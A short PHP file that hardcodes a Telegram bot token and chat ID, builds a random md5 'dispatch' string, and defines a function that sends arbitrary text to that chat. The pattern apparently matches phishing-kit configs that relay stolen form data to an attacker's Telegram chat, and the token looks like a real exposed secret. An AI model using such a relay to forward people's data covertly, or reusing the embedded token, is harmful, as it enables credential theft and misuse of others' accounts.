<?php
$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);
$token = "5328374932:AAHxW6wF_G_ySzBregSJXSvCeaGUZUKN3SA";
$chatid = "-5538760025";
	function sendMessage($chatID, $messaggio, $token) {

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
?>